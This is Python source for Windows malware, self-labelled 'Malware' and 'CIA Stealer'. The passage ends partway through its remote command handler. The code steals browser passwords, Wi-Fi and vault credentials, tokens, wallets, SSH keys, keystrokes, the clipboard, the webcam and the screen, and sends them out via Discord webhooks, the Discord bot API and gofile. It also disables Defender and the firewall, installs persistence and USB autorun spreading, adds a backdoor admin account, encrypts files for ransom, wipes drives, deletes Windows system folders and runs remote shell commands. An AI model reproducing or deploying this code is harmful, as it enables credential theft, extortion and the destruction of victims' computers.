import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time, threading, win32clipboard, io
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path
try:
    import keyboard
except:
    pass
try:
    import pyautogui
    import numpy as np
except:
    pass
try:
    import pyaudio
    import wave
except:
    pass
try:
    import winreg
except:
    pass
def load_config():
    try:
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
        with open(config_path, "r") as f:
            return json.load(f)
    except:
        return {
            "webhook": "",
            "hidden": "",
            "bot_token": "",
            "channel_id": ""
        }

config = load_config()
WEBHOOK = config.get("webhook", "")
HIDDEN = config.get("hidden", "")
BOT_TOKEN = config.get("bot_token", "")
CHANNEL_ID = config.get("channel_id", "")

class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.windows = os.environ.get("WINDIR")
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])
        self.program_files = Path(os.environ.get("ProgramFiles", "C:\\Program Files"))
        self.program_files_x86 = Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"))

class Malware:
    def __init__(self):
        self.zip_name = f"109_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = WEBHOOK
        self.hidden_webhook = HIDDEN
        self.bot_token = BOT_TOKEN
        self.channel_id = CHANNEL_ID
        self.browser_infos = ["extentions","passwords","cookies","history","downloads","cards"]
        self.session_files = ["Wallets","Game Launchers","Apps"]
        self.task_manager_blocked = False
        self.running = True
        self.authenticated = False
        self.victim_id = socket.gethostname()
        self.discord_user = getpass.getuser()
        self.ip = socket.gethostbyname(socket.gethostname())
        
    def send_victim_info(self):
        info = f"""
NEW VICTIM
Hostname: {self.victim_id}
User: {self.discord_user}
IP: {self.ip}
OS: {platform.system()} {platform.release()}
CPU: {os.cpu_count()} cores
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        self.send_discord(info)
        self.send(info)
        
    def send(self, content, files=None, hidden=False):
        try:
            url = self.hidden_webhook if hidden else self.webhook_url
            if files:
                requests.post(url, data={"content": content}, files=files, timeout=25)
            else:
                requests.post(url, json={"content": content}, timeout=25)
        except: pass
    
    def send_discord(self, content, files=None):
        try:
            url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages"
            headers = {"Authorization": f"Bot {self.bot_token}"}
            if files:
                requests.post(url, headers=headers, data={"content": content}, files=files)
            else:
                requests.post(url, headers=headers, json={"content": content})
        except: pass
    
    def delete_file(self, path):
        try:
            if os.path.isfile(path): os.remove(path)
            elif os.path.isdir(path): shutil.rmtree(path)
        except: pass
    
    def hide_console(self):
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    
    def disable_defender(self):
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
            'sc stop WinDefend', 'sc delete WinDefend'
        ]
        for c in cmds:
            try: subprocess.run(c, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: pass
    
    def startup_persistence(self):
        try:
            src = os.path.abspath(sys.argv[0])
            dst = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "SystemHelper.exe")
            shutil.copy2(src, dst)
            subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "{src}" /f', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run(f'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "{src}" /f', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{src}" /sc onlogon /f', shell=True, stdout=subprocess.DEVNULL)
        except: pass

    def block_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            hkey = ctypes.c_void_p()
            ctypes.windll.advapi32.RegCreateKeyExW(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            val = ctypes.c_uint32(1)
            ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(val), 4)
            ctypes.windll.advapi32.RegCloseKey(hkey)
        except: pass

    def unblock_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            hkey = ctypes.c_void_p()
            ctypes.windll.advapi32.RegCreateKeyExW(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            val = ctypes.c_uint32(0)
            ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(val), 4)
            ctypes.windll.advapi32.RegCloseKey(hkey)
        except: pass

    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            embed = {
                "title": "CIA Stealer",
                "color": 0xE53935,
                "fields": [
                    {"name": "Hostname", "value": socket.gethostname(), "inline": True},
                    {"name": "User", "value": getpass.getuser(), "inline": True},
                    {"name": "IP", "value": socket.gethostbyname(socket.gethostname()), "inline": True},
                    {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
                ],
                "footer": {"text": "109"}
            }
            payload = {"username": "System", "embeds": [embed]}
            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    requests.post(self.webhook_url, data={"payload_json": json.dumps(payload)}, files={"file": (os.path.basename(file_path), f)})
            else:
                requests.post(self.webhook_url, json=payload)
        except: pass

    def upload_gofile(self, file_path):
        try:
            with open(file_path, "rb") as f:
                r = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}, timeout=30)
                if r.status_code == 200 and r.json().get("status") == "ok":
                    return r.json()["data"]["downloadPage"]
        except: pass
        return None

    def start_stealer(self, zip_file):
        try:
            StealerFunctions.Interesting_Files(zip_file)
            StealerFunctions.Screenshot(zip_file)
            StealerFunctions.AntiVirus_Infos(zip_file)
            StealerFunctions.Discord_Tokens(zip_file)
            StealerFunctions.Roblox_Cookies(zip_file)
            StealerFunctions.Session_files(zip_file, self.session_files)
            StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
            StealerFunctions.Webcam(zip_file)
            StealerFunctions.System_Infos(zip_file)
            StealerFunctions.WiFi_Passwords(zip_file)
            StealerFunctions.Telegram_Sessions(zip_file)
            StealerFunctions.Search_Important_Files(zip_file)
            StealerFunctions.Clipboard_Monitor(zip_file)
            StealerFunctions.Keylogger(zip_file)
            StealerFunctions.Screen_Recorder(zip_file)
            StealerFunctions.Mic_Recorder(zip_file)
            StealerFunctions.Port_Scanner(zip_file)
            StealerFunctions.Running_Processes(zip_file)
            StealerFunctions.Installed_Programs(zip_file)
            StealerFunctions.Email_Stealer(zip_file)
            StealerFunctions.VPN_Config_Stealer(zip_file)
            StealerFunctions.FTP_SSH_Credentials(zip_file)
            StealerFunctions.Python_Scripts_Stealer(zip_file)
            StealerFunctions.Crypto_Wallets(zip_file)
            StealerFunctions.System_Files(zip_file)
            StealerFunctions.SSH_Keys(zip_file)
            StealerFunctions.Discord_Injector()
            return True
        except: return False

    def ransomware(self):
        try:
            key = os.urandom(32)
            self.send(f"RANSOMWARE KEY: {key.hex()}", hidden=True)
            self.send_discord(f"RANSOMWARE STARTED")
            targets = [os.path.join(os.environ["USERPROFILE"], x) for x in ["Desktop","Documents","Pictures","Videos","Downloads"]]
            count = 0
            for target in targets:
                if not os.path.exists(target): continue
                for root, _, files in os.walk(target):
                    for file in files:
                        ext = os.path.splitext(file)[1].lower()
                        if ext in ('.txt','.doc','.docx','.pdf','.jpg','.png','.mp4','.zip','.rar','.xlsx','.pptx','.psd','.ai','.cdr','.dwg','.sql','.db','.bak','.7z','.gz'):
                            full = os.path.join(root, file)
                            if os.path.getsize(full) < 100*1024*1024:
                                try:
                                    iv = os.urandom(16)
                                    cipher = AES.new(key, AES.MODE_CBC, iv)
                                    with open(full, 'rb') as f: data = f.read()
                                    enc = cipher.encrypt(pad(data, AES.block_size))
                                    with open(full + '.encrypted', 'wb') as f: f.write(iv + enc)
                                    os.remove(full)
                                    count += 1
                                    if count % 10 == 0: time.sleep(0.3)
                                except: pass
            note = f"""YOUR FILES ARE ENCRYPTED
KEY: {key.hex()[:16]}
dis: https://discord.gg/CWkGWU6U2z
CONTACT: e-mailyou@protonmail.com"""
            with open(os.path.join(os.environ["USERPROFILE"], "Desktop", "READ_ME_NOW.txt"), "w") as f: f.write(note)
            self.send(f"RANSOMWARE: {count} FILES")
            self.send_discord(f"RANSOMWARE: {count} FILES")
        except: pass

    def spread_usb(self):
        while self.running:
            try:
                for part in psutil.disk_partitions():
                    if 'removable' in part.opts or 'cdrom' in part.opts:
                        shutil.copy2(sys.argv[0], os.path.join(part.mountpoint, "SystemHelper.exe"))
                        with open(os.path.join(part.mountpoint, "autorun.inf"), "w") as f:
                            f.write("[AutoRun]\nopen=SystemHelper.exe\naction=Open folder\nshell\\open\\command=SystemHelper.exe")
            except: pass
            time.sleep(15)

    def destroy_system(self):
        try:
            self.send_discord(f"SYSTEM DESTRUCTION STARTED")
            for d in [r"C:\Windows\System32", r"C:\Windows\SysWOW64", r"C:\Windows\System64"]:
                if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)
            for f in ["bootmgr", "boot.ini", "ntldr"]:
                try: os.remove(f"C:\\{f}")
                except: pass
            subprocess.run('format C: /fs:NTFS /q /y', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.send("SYSTEM DESTROYED")
            self.send_discord(f"SYSTEM DESTROYED")
        except: pass

    def destroy_windows(self):
        try:
            self.send_discord(f"WINDOWS DESTRUCTION STARTED")
            windows_dirs = [
                r"C:\Windows", r"C:\Windows\System32", r"C:\Windows\SysWOW64",
                r"C:\Windows\System64", r"C:\Windows\Boot", r"C:\Windows\CSC",
                r"C:\Windows\Cursors", r"C:\Windows\Debug", r"C:\Windows\Fonts",
                r"C:\Windows\Help", r"C:\Windows\inf", r"C:\Windows\L2Schemas",
                r"C:\Windows\Media", r"C:\Windows\Microsoft.NET", r"C:\Windows\Minidump",
                r"C:\Windows\Performance", r"C:\Windows\PLA", r"C:\Windows\PolicyDefinitions",
                r"C:\Windows\Prefetch", r"C:\Windows\Registration", r"C:\Windows\repair",
                r"C:\Windows\Resources", r"C:\Windows\SchCache", r"C:\Windows\Security",
                r"C:\Windows\ServiceProfiles", r"C:\Windows\servicing", r"C:\Windows\System",
                r"C:\Windows\SystemResources", r"C:\Windows\Tasks", r"C:\Windows\Temp",
                r"C:\Windows\Web", r"C:\Windows\WinSxS"
            ]
            for d in windows_dirs:
                if os.path.exists(d):
                    try:
                        shutil.rmtree(d, ignore_errors=True)
                    except: pass
            try:
                subprocess.run('reg delete HKEY_LOCAL_MACHINE /f', shell=True, stdout=subprocess.DEVNULL)
                subprocess.run('reg delete HKEY_CURRENT_USER /f', shell=True, stdout=subprocess.DEVNULL)
            except: pass
            boot_files = ["bootmgr", "boot.ini", "ntldr", "ntdetect.com", "boot.sdi", "bootmgr.efi"]
            for f in boot_files:
                try:
                    if os.path.exists(f"C:\\{f}"): os.remove(f"C:\\{f}")
                except: pass
            self.send_discord(f"WINDOWS DESTROYED")
            self.send("WINDOWS DESTROYED")
        except Exception as e:
            self.send_discord(f"WINDOWS DESTROY ERROR: {str(e)}")

    def wipe_drive(self, drive="C:"):
        try:
            subprocess.run(f'format {drive} /fs:NTFS /q /y', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"DRIVE {drive} WIPED")
        except: pass

    def format_drive(self, drive="C:"):
        try:
            subprocess.run(f'format {drive} /fs:NTFS /q /y', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"DRIVE {drive} FORMATTED")
        except: pass

    def webcam_loop(self):
        while self.running:
            try:
                cap = cv2.VideoCapture(0)
                for _ in range(3):
                    ret, frame = cap.read()
                    if ret:
                        cv2.imwrite("webcam.jpg", frame)
                        with open("webcam.jpg", "rb") as f:
                            self.send(f"WEBCAM", {"file": ("webcam.jpg", f, "image/jpeg")})
                            self.send(f"WEBCAM", {"file": ("webcam.jpg", f, "image/jpeg")}, hidden=True)
                            self.send_discord(f"WEBCAM", {"file": ("webcam.jpg", f, "image/jpeg")})
                        os.remove("webcam.jpg")
                        time.sleep(0.5)
                cap.release()
            except: pass
            time.sleep(30)

    def screenshot_loop(self):
        while self.running:
            try:
                img = pyautogui.screenshot()
                img.save("sc.png")
                with open("sc.png", "rb") as f:
                    self.send(f"SCREENSHOT", {"file": ("sc.png", f, "image/png")})
                    self.send(f"SCREENSHOT", {"file": ("sc.png", f, "image/png")}, hidden=True)
                    self.send_discord(f"SCREENSHOT", {"file": ("sc.png", f, "image/png")})
                os.remove("sc.png")
            except: pass
            time.sleep(10)

    def clipboard_monitor(self):
        last = ""
        while self.running:
            try:
                clip = pyperclip.paste()
                if clip and clip != last:
                    last = clip
                    if re.match(r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', clip) or re.match(r'^0x[a-fA-F0-9]{40}$', clip):
                        self.send(f"CRYPTO: {clip}")
                        self.send(f"CRYPTO: {clip}", hidden=True)
                        self.send_discord(f"CRYPTO: {clip}")
                    else:
                        self.send(f"CLIPBOARD: {clip[:500]}")
                        self.send_discord(f"CLIPBOARD: {clip[:500]}")
            except: pass
            time.sleep(1)

    def keylogger(self, key):
        try:
            k = key.char if hasattr(key, 'char') and key.char else f"[{key.name}]" if hasattr(key, 'name') else "[UNKNOWN]"
            with open(os.path.join(Paths().temp, "keys.log"), "a") as f:
                f.write(k)
        except: pass

    def bitcoin_miner(self):
        try:
            import hashlib
            while self.running:
                nonce = random.randint(0, 2**32)
                data = f"block{nonce}{random.random()}".encode()
                hash_result = hashlib.sha256(data).hexdigest()
                if hash_result[:4] == "0000":
                    self.send(f"MINED: {hash_result} | NONCE: {nonce}")
                    self.send_discord(f"MINED: {hash_result}")
                time.sleep(0.01)
        except: pass

    def get_windows_creds(self):
        try:
            result = subprocess.check_output('cmdkey /list', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"WINDOWS CREDENTIALS:\n```\n{result[:1900]}\n```")
            vault_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Vault")
            if os.path.exists(vault_path):
                shutil.make_archive("vault", "zip", vault_path)
                with open("vault.zip", "rb") as f:
                    self.send_discord(f"VAULT CREDS", {"file": ("vault.zip", f)})
                os.remove("vault.zip")
        except: pass

    def get_network_info(self):
        try:
            result = subprocess.check_output('ipconfig /all', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"NETWORK INFO:\n```\n{result[:1900]}\n```")
        except: pass

    def get_processes(self):
        try:
            result = subprocess.check_output('tasklist', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"PROCESSES:\n```\n{result[:1900]}\n```")
        except: pass

    def get_services(self):
        try:
            result = subprocess.check_output('sc query', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"SERVICES:\n```\n{result[:1900]}\n```")
        except: pass

    def get_firewall_status(self):
        try:
            result = subprocess.check_output('netsh advfirewall show allprofiles', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"FIREWALL STATUS:\n```\n{result[:1900]}\n```")
        except: pass

    def disable_firewall(self):
        try:
            subprocess.run('netsh advfirewall set allprofiles state off', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"FIREWALL DISABLED")
        except: pass

    def enable_firewall(self):
        try:
            subprocess.run('netsh advfirewall set allprofiles state on', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"FIREWALL ENABLED")
        except: pass

    def get_all_credentials(self):
        try:
            local = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            login = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            if os.path.exists(local) and os.path.exists(login):
                with open(local, "r") as f: data = json.load(f)
                key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
                master = CryptUnprotectData(key, None, None, None, 0)[1]
                shutil.copy(login, "login.db")
                conn = sqlite3.connect("login.db")
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                out = "CHROME PASSWORDS:\n"
                for row in c.fetchall():
                    if row[2] and len(row[2]) > 16:
                        try:
                            iv = row[2][3:15]
                            ct = row[2][15:-16]
                            tag = row[2][-16:]
                            cipher = AES.new(master, AES.MODE_GCM, iv)
                            pwd = cipher.decrypt_and_verify(ct, tag).decode()
                            out += f"{row[0]}|{row[1]}|{pwd}\n"
                        except: pass
                conn.close()
                os.remove("login.db")
                self.send_discord(f"```\n{out[:1900]}\n```")
            wifi = subprocess.check_output('netsh wlan show profile name=* key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
            self.send_discord(f"WIFI PASSWORDS:\n```\n{wifi[:1900]}\n```")
            self.get_windows_creds()
        except: pass

    def enable_rdp(self):
        try:
            subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"RDP ENABLED")
        except: pass

    def create_backdoor_user(self):
        try:
            username = "Administrator"
            password = "P@ssw0rd123!"
            subprocess.run(f'net user {username} {password} /add', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run(f'net localgroup administrators {username} /add', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run(f'net localgroup "Remote Desktop Users" {username} /add', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"BACKDOOR USER: {username}:{password}")
        except: pass

    def lock_screen(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            self.send_discord(f"SCREEN LOCKED")
        except: pass

    def shutdown_pc(self):
        try:
            subprocess.run('shutdown /s /t 0', shell=True)
            self.send_discord(f"SHUTDOWN")
        except: pass

    def restart_pc(self):
        try:
            subprocess.run('shutdown /r /t 0', shell=True)
            self.send_discord(f"RESTART")
        except: pass

    def bsod(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 0x6, ctypes.byref(ctypes.c_uint()))
            self.send_discord(f"BSOD")
        except: pass

    def delete_all(self):
        try:
            for root, dirs, files in os.walk(Paths().userprofile):
                for f in files:
                    try: os.remove(os.path.join(root, f))
                    except: pass
                for d in dirs:
                    try: shutil.rmtree(os.path.join(root, d), ignore_errors=True)
                    except: pass
            self.send_discord(f"ALL FILES DELETED")
        except: pass

    def run_keylogger(self):
        keyboard.on_press(self.keylogger)
        self.send_discord(f"KEYLOGGER STARTED")

    def stop_keylogger(self):
        try:
            keyboard.unhook_all()
            self.send_discord(f"KEYLOGGER STOPPED")
        except: pass

    def upload_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                self.send_discord(f"FILE NOT FOUND: {file_path}")
                return
            url = self.upload_gofile(file_path)
            if url:
                self.send_discord(f"FILE UPLOADED: {url}")
            else:
                with open(file_path, "rb") as f:
                    self.send_discord(f"FILE: {os.path.basename(file_path)}", {"file": (os.path.basename(file_path), f)})
        except Exception as e:
            self.send_discord(f"UPLOAD ERROR: {str(e)}")

    def open_app(self, app_name):
        try:
            subprocess.Popen(app_name, shell=True)
            self.send_discord(f"APP OPENED: {app_name}")
        except Exception as e:
            self.send_discord(f"OPEN ERROR: {str(e)}")

    def kill_app(self, app_name):
        try:
            subprocess.run(f'taskkill /f /im {app_name}', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"APP KILLED: {app_name}")
        except Exception as e:
            self.send_discord(f"KILL ERROR: {str(e)}")

    def kill_pid(self, pid):
        try:
            subprocess.run(f'taskkill /f /pid {pid}', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"PID {pid} KILLED")
        except Exception as e:
            self.send_discord(f"KILL PID ERROR: {str(e)}")

    def delete_app(self, app_path):
        try:
            if os.path.exists(app_path):
                if os.path.isdir(app_path):
                    shutil.rmtree(app_path, ignore_errors=True)
                else:
                    os.remove(app_path)
                self.send_discord(f"APP DELETED: {app_path}")
            else:
                self.send_discord(f"APP NOT FOUND: {app_path}")
        except Exception as e:
            self.send_discord(f"DELETE ERROR: {str(e)}")

    def record_screen(self, duration=10):
        try:
            size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter("screen_rec.avi", fourcc, 10.0, size)
            for _ in range(duration * 10):
                frame = np.array(pyautogui.screenshot())
                out.write(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
            out.release()
            with open("screen_rec.avi", "rb") as f:
                self.send_discord(f"SCREEN RECORDING", {"file": ("screen_rec.avi", f)})
            os.remove("screen_rec.avi")
        except Exception as e:
            self.send_discord(f"RECORD ERROR: {str(e)}")

    def disable_keyboard(self):
        try:
            subprocess.run('rundll32.exe keyboard,disable', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"KEYBOARD DISABLED")
        except: pass

    def enable_keyboard(self):
        try:
            subprocess.run('rundll32.exe keyboard,enable', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"KEYBOARD ENABLED")
        except: pass

    def disable_mouse(self):
        try:
            subprocess.run('rundll32.exe mouse,disable', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"MOUSE DISABLED")
        except: pass

    def enable_mouse(self):
        try:
            subprocess.run('rundll32.exe mouse,enable', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"MOUSE ENABLED")
        except: pass

    def volume_mute(self):
        try:
            subprocess.run('nircmd.exe mutesysvolume 2', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"VOLUME MUTED")
        except: pass

    def volume_unmute(self):
        try:
            subprocess.run('nircmd.exe mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"VOLUME UNMUTED")
        except: pass

    def set_volume(self, level):
        try:
            subprocess.run(f'nircmd.exe setsysvolume {int(level)*655}', shell=True, stdout=subprocess.DEVNULL)
            self.send_discord(f"VOLUME SET TO {level}%")
        except: pass

    def process_command(self, cmd):
        try:
            if cmd.startswith("SHELL|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    result = subprocess.check_output(parts[2], shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="ignore")
                    self.send_discord(f"```\n{result[:1900]}\n```")
            elif cmd.startswith("SCREENSHOT|"):
                self.execute_command("screenshot")
            elif cmd.startswith("WEBCAM|"):
                self.execute_command("webcam")
            elif cmd.startswith("DOWNLOAD|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"download {parts[2]}")
            elif cmd.startswith("UPLOAD|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"upload {parts[2]}")
            elif cmd.startswith("KEYLOG|"):
                self.execute_command("keylog")
            elif cmd.startswith("LOCK|"):
                self.execute_command("lock")
            elif cmd.startswith("SHUTDOWN|"):
                self.execute_command("shutdown")
            elif cmd.startswith("RESTART|"):
                self.execute_command("restart")
            elif cmd.startswith("BSOD|"):
                self.execute_command("bsod")
            elif cmd.startswith("DELETEALL|"):
                self.execute_command("deleteall")
            elif cmd.startswith("RANSOMWARE|"):
                self.execute_command("ransomware")
            elif cmd.startswith("DESTROY|"):
                self.execute_command("destroy")
            elif cmd.startswith("DESTROYWINDOWS|"):
                self.execute_command("destroywindows")
            elif cmd.startswith("CREDS|"):
                self.execute_command("creds")
            elif cmd.startswith("RDP|"):
                self.execute_command("rdp")
            elif cmd.startswith("BACKDOOR|"):
                self.execute_command("backdoor")
            elif cmd.startswith("RECORD|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"record {parts[2]}")
                else:
                    self.execute_command("record")
            elif cmd.startswith("MUTE|"):
                self.execute_command("mute")
            elif cmd.startswith("UNMUTE|"):
                self.execute_command("unmute")
            elif cmd.startswith("VOLUME|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"volume {parts[2]}")
            elif cmd.startswith("OPEN|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"open {parts[2]}")
            elif cmd.startswith("KILL|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"kill {parts[2]}")
            elif cmd.startswith("DISABLEAV|"):
                self.execute_command("disableav")
            elif cmd.startswith("BLOCKTASKMGR|"):
                self.execute_command("blocktaskmgr")
            elif cmd.startswith("DISABLEKB|"):
                self.execute_command("disablekb")
            elif cmd.startswith("ENABLEKB|"):
                self.execute_command("enablekb")
            elif cmd.startswith("DISABLEMOUSE|"):
                self.execute_command("disablemouse")
            elif cmd.startswith("ENABLEMOUSE|"):
                self.execute_command("enablemouse")
            elif cmd.startswith("WIPE|"):
                self.execute_command("wipe")
            elif cmd.startswith("FORMATDRIVE|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"formatdrive {parts[2]}")
                else:
                    self.execute_command("formatdrive")
            elif cmd.startswith("NETWORK|"):
                self.execute_command("network")
            elif cmd.startswith("PROCESSES|"):
                self.execute_command("processes")
            elif cmd.startswith("SERVICES|"):
                self.execute_command("services")
            elif cmd.startswith("FIREWALL|"):
                self.execute_command("firewall")
            elif cmd.startswith("DISABLEFIREWALL|"):
                self.execute_command("disablefirewall")
            elif cmd.startswith("ENABLEFIREWALL|"):
                self.execute_command("enablefirewall")
            elif cmd.startswith("PORTS|"):
                self.execute_command("ports")
            elif cmd.startswith("KILLPID|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    self.execute_command(f"killpid {parts[2]}")
            elif cmd.startswith("SCREENSHOTALL|"):
                self.execute_command("screenshot")
            elif cmd.startswith("SHUTDOWNALL|"):
                self.execute_command("shutdown")
            elif cmd.startswith("RESTARTALL|"):
                self.execute_command("restart")
            elif cmd.startswith("DESTROYALL|"):
                self.execute_command("destroy")
            elif cmd.startswith("DESTROYWINDOWSALL|"):
                self.execute_command("destroywindows")
            elif cmd.startswith("RANSOMWAREALL|"):
                self.execute_command("ransomware")
            elif cmd.startswith("BROADCAST:"):
                self.execute_command(cmd.replace("BROADCAST:", "").strip())
        except Exception as e:
            self.send_discord(f"ERROR: {str(e)}")

    def execute_command(self, cmd):
        try:
            if not self.authenticated:
                self.send_discord("AUTH REQUIRED: !login <password>")
                return
                
            if cmd.startswith("shell "):
                result = subprocess.check_output(cmd[6:], shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="ignore")
                self.send_discord(f"```\n{result[:1900]}\n```")
            elif cmd == "screenshot":
                img = pyautogui.screenshot()
                img.save("sc.png")
                with open("sc.png", "rb") as f:
                    self.send_discord(f"SCREENSHOT", {"file": ("sc.png", f, "image/png")})
                os.remove("sc.png")
            elif cmd == "webcam":
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite("cam.jpg", frame)
                    with open("cam.jpg", "rb") as f:
                        self.send_discord(f"WEBCAM", {"file": ("cam.jpg", f, "image/jpeg")})
                    os.remove("cam.jpg")
                cap.release()
            elif cmd == "info":
                self.send_discord(f"HOST: {self.victim_id}\nUSER: {self.discord_user}\nIP: {self.ip}\nOS: {platform.system()} {platform.release()}\nCPU: {os.cpu_count()} cores\nRAM: {round(psutil.virtual_memory().total/1024**3,2)} GB")
            elif cmd == "list":
                self.send_discord(f"FILES: {', '.join(os.listdir(os.getcwd())[:20])}")
            elif cmd.startswith("download "):
                f = cmd[9:].strip()
                if os.path.exists(f):
                    with open(f, "rb") as file:
                        self.send_discord(f"DOWNLOAD: {f}", {"file": (f, file)})
                else: self.send_discord(f"NOT FOUND: {f}")
            elif cmd == "keylog":
                if os.path.exists(os.path.join(Paths().temp, "keys.log")):
                    with open(os.path.join(Paths().temp, "keys.log"), "r") as f:
                        self.send_discord(f"KEYLOG:\n```\n{f.read()[:1900]}\n```")
                else: self.send_discord("NO KEYLOG")
            elif cmd == "clear":
                if os.path.exists(os.path.join(Paths().temp, "keys.log")):
                    os.remove(os.path.join(Paths().temp, "keys.log"))
                    self.send_discord(f"KEYLOG CLEARED")
            elif cmd == "persistence":
                self.startup_persistence()
                self.send_discord(f"PERSISTENCE ADDED")
            elif cmd == "ransomware":
                threading.Thread(target=self.ransomware, daemon=True).start()
                self.send_discord(f"RANSOMWARE STARTED")
            elif cmd == "destroy":
                threading.Thread(target=self.destroy_system, daemon=True).start()
                self.send_discord(f"DESTROY STARTED")
            elif cmd == "destroywindows":
                threading.Thread(target=self.destroy_windows, daemon=True).start()
                self.send_discord(f"DESTROY WINDOWS STARTED")
